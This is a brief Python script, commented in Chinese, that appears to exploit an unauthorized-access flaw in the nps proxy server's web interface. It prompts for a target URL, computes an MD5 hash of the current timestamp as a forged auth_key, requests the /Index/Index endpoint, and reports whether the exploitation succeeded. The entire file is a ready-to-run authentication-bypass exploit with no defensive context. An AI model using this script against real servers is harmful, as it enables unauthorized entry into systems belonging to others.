import hashlib
import datetime
import time
import requests

#  输入url地址
url = input("请输入漏洞网址:")

# 获取当前时间戳
timestamps = int(time.time())

# 将时间戳转换为字符串并进行编码
timestamp_str = str(timestamps).encode('utf-8')

# 创建一个MD5哈希对象
hash_object = hashlib.md5()

# 对时间戳进行加密
hash_object.update(timestamp_str)

# 获取加密后的结果
encrypted_timestamp = hash_object.hexdigest()

#  输出加密后并访问的url地址
vuln = f"{url}/Index/Index?auth_key={encrypted_timestamp}&timestamp={timestamps}"

#  请求这个漏洞地址
response = requests.get(f"{vuln}")

#  看看返回装状态码
# print("状态码：", response.status_code)

# 判断请求是否成功
if response.status_code == 200:
    print("nps未授权漏洞利用成功")
else:
    print("nps未授权漏洞利用失败")
